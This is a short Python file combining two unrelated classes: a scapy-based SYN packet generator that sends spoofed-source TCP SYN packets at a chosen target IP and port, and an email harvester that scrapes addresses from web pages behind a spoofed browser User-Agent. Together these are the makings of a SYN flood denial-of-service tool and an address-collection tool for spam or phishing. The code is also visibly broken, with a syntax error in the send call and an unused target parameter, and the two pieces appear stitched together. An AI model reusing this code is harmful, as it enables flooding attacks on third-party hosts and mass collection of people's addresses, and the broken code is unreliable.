from scapy.all import *
import random

class SynTester:
    def __init__(self, target_ip: str, target_port: int):
        self.target = (target_ip, target_port)
        self.iface = conf.iface
        
    def generate_syn(self, count: int, pps: int):
        base_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
        ip_layer = IP(src=RandIP(base_ip), dst=self.target[0])
        tcp_layer = TCP(sport=random.randint(1024,65535), dport=self.target[1], flags='S')
        send(ip_layer/tcp_layer, iface=self.iface, count=count), inter=1/pps, verbose=0)

import re, requests
from bs4 import BeautifulSoup

class EmailHarvester:
    EMAIL_REGEX = r'(?i)\b[A-Z0-9._%+-]+@(?:[A-Z0-9-]+\.)+[A-Z]{2,12}\b'
    
    def __init__(self, target: str):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0'})
        
    def extract_emails(self, html: str) -> set:
        soup = BeautifulSoup(html, 'lxml')
        text = soup.get_text(separator=' ', strip=True)
        return set(re.findall(self.EMAIL_REGEX, text))
